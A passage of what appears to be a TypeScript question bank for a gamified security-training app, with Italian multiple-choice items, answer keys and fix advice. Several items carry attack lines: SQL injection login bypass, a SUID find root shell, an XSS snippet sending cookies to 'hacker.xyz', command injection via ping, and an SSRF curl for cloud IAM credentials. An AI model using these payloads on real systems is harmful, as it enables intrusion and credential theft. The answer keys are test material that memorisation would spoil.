    rootCauseBreakdown: {
      cveOrTopic: 'Ingegneria Sociale & Pretexting (MITRE T1566)',
      whyItWorks: 'L\'essere umano è spesso l\'anello debole se sottoposto a situazioni di finta urgenza o autorità.',
      patchRecommendation: 'Istituire procedure di verifica fuori banda prima di comunicare codici o credenziali.',
      terminalProof: '[LOG VOCALE: Chiamante si spaccia per Direttore IT per estorcere reset password]'
    },
    xpReward: 30,
    eloReward: 15
  }
];

export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
  {
    id: 'diag_int_1_sqli',
    title: 'Sicurezza Web: SQL Injection',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Intermediate',
    prompt: 'Analizza la richiesta HTTP. Quale payload provoca il bypass dell\'autenticazione?',
    codeSnippet: 'POST /api/v1/auth/session HTTP/1.1\n{"username": "admin\' OR 1=1-- -", "pass": "x"}',
    options: [
      { id: 'i1_opt1', text: 'Tautologia: "OR 1=1" rende la clausola WHERE sempre VERA', isCorrect: true, explanation: 'La tautologia forza la query a restituire vero e il commento esclude il controllo password.' },
      { id: 'i1_opt2', text: 'La chiave "pass" viene saltata via HTTP smuggling', isCorrect: false },
      { id: 'i1_opt3', text: 'La porta 8443 trasmette cookie di sessione in chiaro', isCorrect: false },
      { id: 'i1_opt4', text: 'L\'header Content-Length provoca un buffer overflow', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-89: SQL Injection',
      whyItWorks: 'La concatenazione diretta di stringhe fa interpretare i dati inseriti come comandi SQL.',
      patchRecommendation: 'Usare sempre query parametrizzate (Prepared Statements).',
      terminalProof: '$ curl -X POST -d \'{"username":"admin\'\\\'\' OR 1=1-- -"}\' https://target.corp/login\nHTTP/1.1 200 OK'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_2_networking',
    title: 'Analisi Pacchetti: Stato Porte TCP',
    type: 'multiple_choice',
    domain: 'Networking',
    difficulty: 'Intermediate',
    prompt: 'Durante una scansione SYN (-sS), la porta risponde con [RST, ACK]. Cosa indica questo stato?',
    codeSnippet: 'FRAME: TCP 10.10.10.50:443 -> 192.168.1.15\nFlags: [RST, ACK], Seq=0, Ack=1',
    options: [
      { id: 'i2_opt1', text: 'CHIUSA (Host raggiungibile, ma rifiuta attivamente la connessione)', isCorrect: true, explanation: 'Un pacchetto RST/ACK indica che il sistema operativo riceve ma non ha servizi in ascolto su quella porta.' },
      { id: 'i2_opt2', text: 'APERTA (In attesa del ClientHello TLS)', isCorrect: false },
      { id: 'i2_opt3', text: 'FILTRATA (Il firewall ha scartato i pacchetti)', isCorrect: false },
      { id: 'i2_opt4', text: 'Attacco ARP spoofing rilevato in tempo reale', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Stati Porte RFC 793 TCP',
      whyItWorks: 'In una SYN scan, le porte aperte rispondono SYN/ACK; quelle chiuse rispondono subito RST/ACK.',
      patchRecommendation: 'Configurare il firewall per scartare (DROP) i pacchetti invece di rispondere con RST.',
      terminalProof: '$ nmap -sS -p 443 10.10.10.50\n443/tcp closed https'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_3_linux',
    title: 'Privilege Escalation: Bit SUID',
    type: 'multiple_choice',
    domain: 'Linux & Bash',
    difficulty: 'Intermediate',
    prompt: 'Perché il binario mostrato consente la privilege escalation a root?',
    codeSnippet: '$ ls -la /usr/bin/find\n-rwsr-xr-x 1 root root 224840 May 12 /usr/bin/find',
    options: [
      { id: 'i3_opt1', text: 'Bit SUID attivo ("s"): esegue comandi con UID di root', isCorrect: true, explanation: 'Il permesso SUID fa girare il binario con i privilegi del proprietario (root).' },
      { id: 'i3_opt2', text: 'Il file è scrivibile liberamente da chiunque', isCorrect: false },
      { id: 'i3_opt3', text: 'Binario cifrato decifrabile solo dal kernel', isCorrect: false },
      { id: 'i3_opt4', text: 'Permessi di sola esecuzione impediscono il reverse engineering', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Privilege Escalation SUID (GTFOBins)',
      whyItWorks: 'find con SUID può lanciare una shell di root tramite il parametro -exec.',
      patchRecommendation: 'Rimuovere il bit SUID non necessario con `chmod u-s /usr/bin/find`.',
      terminalProof: '$ /usr/bin/find . -exec /bin/sh -p \\;\n# whoami\nroot'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_4_jwt',
    title: 'Autenticazione: Validazione Token JWT',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Intermediate',
    prompt: 'Quale difetto permette a un attaccante di falsificare un JSON Web Token (JWT)?',
    codeSnippet: 'HEADER: {"alg": "none", "typ": "JWT"}\nPAYLOAD: {"user": "admin", "role": "root"}',
    options: [
      { id: 'i4_opt1', text: 'Accettazione di "alg": "none" che salta la verifica della firma', isCorrect: true, explanation: 'L\'algoritmo "none" istruisce le librerie vulnerabili a non verificare alcuna firma.' },
      { id: 'i4_opt2', text: 'Il payload è memorizzato in chiaro in Base64', isCorrect: false },
      { id: 'i4_opt3', text: 'Mancanza della data di scadenza "exp"', isCorrect: false },
      { id: 'i4_opt4', text: 'Chiavi HMAC che richiedono certificati pubblici RSA', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Vulnerabilità Alg None RFC 7519',
      whyItWorks: 'Se il server si fida dell\'algoritmo indicato nell\'header, accetta token non firmati.',
      patchRecommendation: 'Impostare rigorosamente gli algoritmi ammessi (es. RS256) e vietare esplicitamente "none".',
      terminalProof: '$ python3 -c "import jwt; jwt.decode(token, algorithms=[\'RS256\'])"'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_5_xss',
    title: 'Attacchi Client-Side: Varianti XSS',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Intermediate',
    prompt: 'Cosa differenzia una vulnerabilità Stored XSS da una Reflected XSS?',
    codeSnippet: 'STORED: <script>fetch("http://hacker.xyz/?c="+document.cookie)</script>',
    options: [
      { id: 'i5_opt1', text: 'Il payload è salvato nel database ed è eseguito da tutti i visitatori', isCorrect: true, explanation: 'La Stored XSS risiede nel server e colpisce chiunque visiti la pagina infetta.' },
      { id: 'i5_opt2', text: 'La Stored XSS funziona solo all\'interno della console di sviluppo', isCorrect: false },
      { id: 'i5_opt3', text: 'La Reflected XSS modifica permanentemente i file del server', isCorrect: false },
      { id: 'i5_opt4', text: 'La Stored XSS viene bloccata automaticamente dai certificati TLS', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-79: Cross-Site Scripting (XSS)',
      whyItWorks: 'L\'input utente non sanificato salvato a database viene renderizzato nell\'HTML dei client.',
      patchRecommendation: 'Eseguire contextual output encoding e configurare una Content-Security-Policy (CSP) restrittiva.',
      terminalProof: 'alert(document.domain)'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_6_cidr',
    title: 'Indirizzamento IP: Subnetting IPv4',
    type: 'multiple_choice',
    domain: 'Networking',
    difficulty: 'Intermediate',
    prompt: 'In notazione CIDR standard, quanti indirizzi host assegnabili ci sono in una subnet /24?',
    codeSnippet: 'NETWORK: 192.168.1.0/24\nNETMASK: 255.255.255.0',
    options: [
      { id: 'i6_opt1', text: '254 host utilizzabili (256 meno rete e broadcast)', isCorrect: true, explanation: 'Una /24 ha 256 indirizzi; sottraendo l\'indirizzo di rete (.0) e quello di broadcast (.255) rimangono 254.' },
      { id: 'i6_opt2', text: '256 host utilizzabili', isCorrect: false },
      { id: 'i6_opt3', text: '512 host utilizzabili', isCorrect: false },
      { id: 'i6_opt4', text: '128 host utilizzabili', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'RFC 4632 Classless Inter-Domain Routing',
      whyItWorks: 'Il primo indirizzo identifica la rete e l\'ultimo è riservato alle trasmissioni di broadcast.',
      patchRecommendation: 'Calcolare con precisione i confini di subnet per evitare sovrapposizioni nelle VPC.',
      terminalProof: '$ ipcalc 192.168.1.0/24 | grep Hosts\nHosts/Net: 254'
    },
    xpReward: 50,
    eloReward: 25
  }
];

export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
  {
    id: 'diag_adv_1_idor',
    title: 'Controllo Accessi: Vulnerabilità IDOR',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Zero-Day',
    prompt: 'Cambiando `user_id=104` in `user_id=1` in una chiamata API, ricevi il cedolino del CEO. Di quale falla si tratta?',
    codeSnippet: 'GET /api/v2/payroll?user_id=1 HTTP/1.1\nCookie: session=operator_104_token\n\nHTTP/1.1 200 OK\n{"salary": 250000, "name": "CEO"}',
    options: [
      { id: 'a1_opt1', text: 'IDOR: Mancanza di controllo di autorizzazione lato server', isCorrect: true, explanation: 'Il server si fida dell\'ID passato senza verificare se l\'utente autenticato ne sia il legittimo proprietario.' },
      { id: 'a1_opt2', text: 'Reflected Cross-Site Scripting (XSS) nella query string', isCorrect: false },
      { id: 'a1_opt3', text: 'SQL Injection durante il parsing del corpo JSON', isCorrect: false },
      { id: 'a1_opt4', text: 'Buffer overflow sul registro dello stack pointer', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-639: Insecure Direct Object Reference (IDOR)',
      whyItWorks: 'Riferimenti a oggetti interni esposti senza controlli d\'accesso a livello di riga.',
      patchRecommendation: 'Verificare che la sessione dell\'utente possieda i permessi per il record richiesto.',
      terminalProof: '$ curl -H "Cookie: session=attacker" https://target.corp/api/doc/1\nHTTP/1.1 200 OK'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_2_rce',
    title: 'Esecuzione Remota: Shell Injection',
    type: 'multiple_choice',
    domain: 'Code Analysis',
    difficulty: 'Zero-Day',
    prompt: 'Perché lo script PHP consente l\'esecuzione arbitraria di comandi di sistema (RCE)?',
    codeSnippet: '<?php\n$host = $_GET["target"];\nsystem("ping -c 2 " . $host);\n?>',
    options: [
      { id: 'a2_opt1', text: 'Input non sanificato passato a system() consente il concatenation (es. ; id)', isCorrect: true, explanation: 'I metacaratteri shell come ; & | permettono di accodare ed eseguire comandi arbitrari sul server.' },
      { id: 'a2_opt2', text: 'Caricamento file senza validazione del tipo MIME', isCorrect: false },
      { id: 'a2_opt3', text: 'Deserializzazione insicura di oggetti pickle in Python', isCorrect: false },
      { id: 'a2_opt4', text: 'Corruzione della memoria tramite stringhe di formato printf', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-78: OS Command Injection',
      whyItWorks: 'Invocare direttamente una shell di sistema consente l\'interpretazione di caratteri speciali.',
      patchRecommendation: 'Utilizzare escapeshellarg() o librerie native di rete senza invocare la shell.',
      terminalProof: '$ curl "https://target.corp/ping.php?target=127.0.0.1;id"\nuid=33(www-data) gid=33(www-data)'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_3_pwn',
    title: 'Binary Exploitation: Corruzione dello Stack',
    type: 'multiple_choice',
    domain: 'Code Analysis',
    difficulty: 'Zero-Day',
    prompt: 'In un buffer overflow x86_64, quale registro della CPU viene sovrascritto per deviare l\'esecuzione?',
    codeSnippet: '[Buffer 64 bytes] -> [Saved RBP 8 bytes] -> [RET_ADDR (RIP)]',
    options: [
      { id: 'a3_opt1', text: 'RIP (Instruction Pointer / Return Address)', isCorrect: true, explanation: 'Sovrascrivendo l\'indirizzo di ritorno, l\'istruzione RET caricherà in RIP l\'indirizzo scelto dall\'attaccante.' },
      { id: 'a3_opt2', text: 'RSP (Stack Pointer)', isCorrect: false },
      { id: 'a3_opt3', text: 'RAX (Accumulatore generico)', isCorrect: false },
      { id: 'a3_opt4', text: 'RFLAGS (Registro dei Flag)', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-121: Stack-based Buffer Overflow',
      whyItWorks: 'Funzioni senza limiti di scrittura corrompono l\'indirizzo di ritorno sullo stack frame.',
      patchRecommendation: 'Compilare con Stack Canaries (-fstack-protector-all), ASLR e DEP/NX attivi.',
      terminalProof: 'Program received signal SIGSEGV, Segmentation fault.\n0x4141414141414141 in ?? ()'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_4_ssrf',
    title: 'Cloud Security: Server-Side Request Forgery',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Zero-Day',
    prompt: 'In ambiente cloud (AWS/GCP), qual è l\'obiettivo più critico esposto da una vulnerabilità SSRF?',
    codeSnippet: 'POST /api/fetch_avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    options: [
      { id: 'a4_opt1', text: 'Instance Metadata Service (IMDS) per estrarre chiavi IAM temporanee', isCorrect: true, explanation: 'L\'indirizzo link-local 169.254.169.254 restituisce i token IAM della macchina, compromettendo il cloud.' },
      { id: 'a4_opt2', text: 'Cronologia e cookie memorizzati nel browser del client', isCorrect: false },
      { id: 'a4_opt3', text: 'Avvelenamento della cache DNS locale del router WiFi', isCorrect: false },
      { id: 'a4_opt4', text: 'Esaurimento delle tabelle MAC hardware dello switch', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
      whyItWorks: 'Chiamate HTTP verso URL arbitrarie possono interrogare servizi interni e di metadati cloud.',
      patchRecommendation: 'Abilitare IMDSv2 (richiede header obbligatori) e bloccare il traffico verso 169.254.169.254.',
      terminalProof: '$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_5_aslr',
    title: 'Mitigazioni Memoria: Randomizzazione ASLR',
    type: 'multiple_choice',
    domain: 'Defense & SOC',
    difficulty: 'Zero-Day',
    prompt: 'Cosa fa l\'Address Space Layout Randomization (ASLR) per proteggere il sistema da buffer overflow?',
    codeSnippet: 'AVVIO 1: base libc = 0x7f81a2000000\nAVVIO 2: base libc = 0x7f43b8c00000',
    options: [
      { id: 'a5_opt1', text: 'Randomizza gli indirizzi di stack, heap e librerie a ogni esecuzione', isCorrect: true, explanation: 'Impedisce all\'attaccante di saltare a indirizzi o gadget ROP prevedibili.' },
      { id: 'a5_opt2', text: 'Rende la memoria dello stack di sola lettura', isCorrect: false },
      { id: 'a5_opt3', text: 'Firma crittograficamente i file eseguibili del sistema', isCorrect: false },
      { id: 'a5_opt4', text: 'Disabilita tutti i puntatori relativi all\'interno della CPU', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Mitigazione ASLR & PIE',
      whyItWorks: 'Senza indirizzi stabili, i payload tradizionali crashano con segmentation fault.',
      patchRecommendation: 'Abilitare PIE in fase di compilazione (-fPIE -pie) e verificare ASLR nel kernel.',
      terminalProof: '$ sysctl kernel.randomize_va_space\nkernel.randomize_va_space = 2'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_6_cors',
    title: 'API Web: Configurazione CORS Errata',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Zero-Day',
    prompt: 'Perché impostare `Access-Control-Allow-Origin: null` con `Credentials: true` è rischioso?',
    codeSnippet: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true',
    options: [
      { id: 'a6_opt1', text: 'Gli iframe sandboxed hanno Origin "null" e possono leggere dati autenticati', isCorrect: true, explanation: 'Un aggressore può usare un iframe sandbox per generare Origin: null e rubare dati riservati della sessione.' },
      { id: 'a6_opt2', text: 'Disattiva completamente la validazione SSL/TLS nei browser', isCorrect: false },
      { id: 'a6_opt3', text: 'Costringe il browser a eseguire comandi di shell sul server', isCorrect: false },
      { id: 'a6_opt4', text: 'Impedisce a utenti legittimi di inviare form o autenticarsi', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-942: Policy CORS Troppo Permissiva',
      whyItWorks: 'L\'origine null può essere generata arbitrariamente con iframe o URI data:.',
      patchRecommendation: 'Non accettare mai Origin null con credenziali; usare una whitelist esplicita di domini autorizzati.',
      terminalProof: '<iframe sandbox="allow-scripts allow-top-navigation" src="..."></iframe>'
    },
    xpReward: 70,
    eloReward: 35
  }
];

// Default backwards compatibility exports
export const BEGINNER_DIAGNOSTIC_QUESTIONS = BEGINNER_DIAGNOSTIC_QUESTIONS_EN;
export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS = INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN;
export const ADVANCED_DIAGNOSTIC_QUESTIONS = ADVANCED_DIAGNOSTIC_QUESTIONS_EN;

/**
 * Returns calibrated diagnostic questions based on user's selected level and language.
 * Dynamically picks 3 random questions from the pool and shuffles option order
 * every single time, ensuring initial questions and answers are never static!
 */
export function getDiagnosticQuestionsForLevel(level: string, lang: Language = getSavedLanguage()): HardcoreQuestion[] {
  let sourceQuestions: HardcoreQuestion[];
  const isIt = lang === 'it';

  if (level === 'beginner') {
    sourceQuestions = isIt ? BEGINNER_DIAGNOSTIC_QUESTIONS_IT : BEGINNER_DIAGNOSTIC_QUESTIONS_EN;
  } else if (level === 'advanced') {
    sourceQuestions = isIt ? ADVANCED_DIAGNOSTIC_QUESTIONS_IT : ADVANCED_DIAGNOSTIC_QUESTIONS_EN;
  } else {
    sourceQuestions = isIt ? INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT : INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN;
  }

  // Pick 3 random questions from the level pool and shuffle their options with Fisher-Yates
  const sampled = shuffleArray(sourceQuestions).slice(0, 3);

  return sampled.map(q => ({
    ...q,
    options: shuffleArray(q.options)
  }));
}

export const DIAGNOSTIC_QUESTIONS = INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN;
